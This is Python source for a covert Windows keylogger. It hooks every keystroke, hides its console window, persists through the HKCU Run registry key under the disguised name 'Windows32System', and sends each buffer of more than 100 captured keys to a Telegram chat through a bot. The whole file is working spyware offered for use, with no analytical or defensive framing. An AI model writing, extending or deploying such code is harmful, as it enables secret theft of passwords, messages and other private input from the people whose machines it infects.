import pyWinhook as pyHook
import threading
import pythoncom
import telebot
import winreg as reg 
import os
import sys
import win32event, win32api, winerror




class Keylog:
	strok = ''
	count = 0
	id = 0


def KeyFilter(event):
	if (event.KeyID == 13):
		Keylog.strok += '(Enter)'
	elif (event.KeyID == 8):
		Keylog.strok += '(Backspace)'
	elif (event.KeyID == 16):
		Keylog.strok += '(shift)'
	elif (event.KeyID == 9):
		Keylog.strok += '(Tab)'
	elif (event.KeyID == 17):
		Keylog.strok += '(ctrl)'
	elif (event.KeyID == 18):
		Keylog.strok += '(ALT)'
	else:
		Keylog.strok += chr(event.Ascii)
	#print(Keylog.strok)
	return True


class myThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        main()

def disallow_Multiple_Instances():
	Keylog.count += 1
	mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
	if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS) or (Keylog.count == 2):
		mutex = None
		Keylog.count = 1
		exit(0)
    
    

def addStartup():
	fp = os.path.dirname(os.path.realpath(__file__))
	file_name = sys.argv[0].split("\\")[-1]
	new_file_path = fp + "\\" + file_name
	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
	key2change = reg.OpenKey(reg.HKEY_CURRENT_USER, keyVal, 0, reg.KEY_ALL_ACCESS)
	reg.SetValueEx(key2change, "Windows32System", 0, reg.REG_SZ, new_file_path)
	

   
def int():
	hm.UnhookKeyboard()
	Keylog.strok = None
	Keylog.strok = ''
	hm.HookKeyboard()


def sender():
	if len(Keylog.strok) > 100:
		strok2 = Keylog.strok
		bot.send_message(Keylog.id,strok2)
		int()



def OnKeyboardEvent(event):
    KeyFilter(event)
    sender()
    return True

def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

def main():
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()

hide()
addStartup()
bot = telebot.TeleBot("bot token here")
@bot.message_handler(commands=['start'])
def start(message):
	Keylog.id = message.chat.id
	bot.send_message(Keylog.id,"Roger. Starting to transport data " + str(Keylog.id))
hm = pyHook.HookManager()
disallow_Multiple_Instances()
thread = myThread(1,"Thread",1)
thread.start()
bot.polling()
